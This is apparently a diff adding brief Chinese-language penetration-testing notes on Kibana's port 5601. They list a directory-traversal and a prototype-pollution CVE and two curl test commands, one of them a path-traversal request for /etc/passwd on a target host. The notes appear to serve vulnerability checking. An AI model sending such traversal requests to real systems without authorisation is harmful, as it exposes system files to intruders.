@@ -1,1 +1,4 @@
-rce
+Kibana 分析界面 (5601)
+漏洞：目录遍历(CVE-2018-17246)、原型链污染(CVE-2019-7609)
+测试: curl http://target:5601/api/status
+curl http://target:5601/../../../etc/passwd
